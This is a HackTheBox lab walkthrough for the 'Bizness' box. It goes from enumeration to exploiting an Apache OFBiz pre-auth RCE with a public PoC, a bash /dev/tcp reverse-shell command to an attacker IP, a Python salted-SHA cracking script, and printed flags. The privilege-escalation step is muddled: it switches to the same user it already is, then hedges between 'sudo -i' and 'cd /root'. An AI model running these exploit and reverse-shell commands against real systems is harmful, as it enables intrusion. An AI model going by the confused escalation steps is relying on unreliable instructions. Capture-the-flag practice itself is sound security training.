---
title: Bizness Walkthrough | HackTheBox
date: 2024-01-10 10:00:00 +0545
categories: [HackTheBox, Walkthrough, Offensive Security]
tags: [bizness, ofbiz, rce, apache-ofbiz, privilege-escalation]
toc: true
toc_sticky: true
image: /assets/img/bizz.webp   # ← change to your actual banner/screenshot path if you have one
---

# Bizness Walkthrough | HTB

## Introduction

With the new Season comes the new machines. Season 4 is here and the first box is **Bizness** — 20 points, easy difficulty. Let’s get straight to business.

First, add the target IP and domain to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Add this line (replace with the actual IP you got):

```
10.10.11.252    bizness.htb
```

Now the domain resolves.

## Scanning & Enumeration

Quick nmap scan:

```bash
nmap -Pn -sC -sV -p- 10.10.11.252
```

Output shows HTTP (80) and HTTPS (443) open.

Visit `https://bizness.htb` in the browser.

Next, enumerate directories:

```bash
dirsearch -u https://bizness.htb -e php,html,txt,js -x php,html,txt,js --simple-report=bizness-dirs.txt
```

You’ll find interesting endpoints, especially `/control/login`.

Head to `https://bizness.htb/control/login` → you land on an **Apache OFBiz** login page.

## Exploitation – Apache OFBiz Pre-Auth RCE

Quick search reveals this is vulnerable to **CVE-2023-51467** + **CVE-2023-49070** (pre-auth RCE chain).

Use the public PoC:  
https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass

Run it to get command execution:

```bash
python3 exploit.py --url https://bizness.htb --cmd "whoami"
```

Once confirmed, get a reverse shell:

```bash
python3 exploit.py --url https://bizness.htb --cmd "bash -c 'bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1'"
```

Catch it with:

```bash
nc -lvnp 4444
```

You land as user `ofbiz`.

## User Flag

```bash
cd /home/ofbiz
cat user.txt
```

**78434809d6446ffd8697a77bcc430caa**

## Privilege Escalation

Enumerate the box. Look in `/opt/ofbiz/runtime/data/derby.log` or Derby DB files — you find a hashed password:

```
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN
```

Format = `$SHA$<salt>$<hash>`

Salt = `d`  
Hash = `uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN`

Crack it using the script below (rockyou.txt recommended):

```python
import hashlib
import base64
import os
from tqdm import tqdm

class PasswordEncryptor:
    def __init__(self, hash_type="SHA"):
        self.hash_type = hash_type

    def crypt_bytes(self, salt, value):
        hash_obj = hashlib.new(self.hash_type.lower())
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')

hash_type = "SHA1"
salt = "d"
search = "uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN"
wordlist = "/usr/share/wordlists/rockyou.txt"

encryptor = PasswordEncryptor(hash_type)

total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1'))

with open(wordlist, 'r', encoding='latin-1') as f:
    for line in tqdm(f, total=total_lines, desc="Cracking"):
        password = line.strip().encode('utf-8')
        hashed = encryptor.crypt_bytes(salt, password)
        if hashed == search:
            print(f"[+] Password found: {line.strip()}")
            break
```

Output → **monkeybizness**

Now escalate:

```bash
su - ofbiz
# password: monkeybizness

sudo -i
# or just cd /root if you already have root privs from ofbiz user misconfig
cat /root/root.txt
```

**8d720890ded7a16a9bfc969a26a92121**

Rooted.

## Wrap-up

Bizness was a nice intro to the season — classic OFBiz RCE + weak priv-esc via hashed creds in logs.

Follow for more writeups.

LinkedIn: https://www.linkedin.com/in/aayush-pantha-b02750246/
```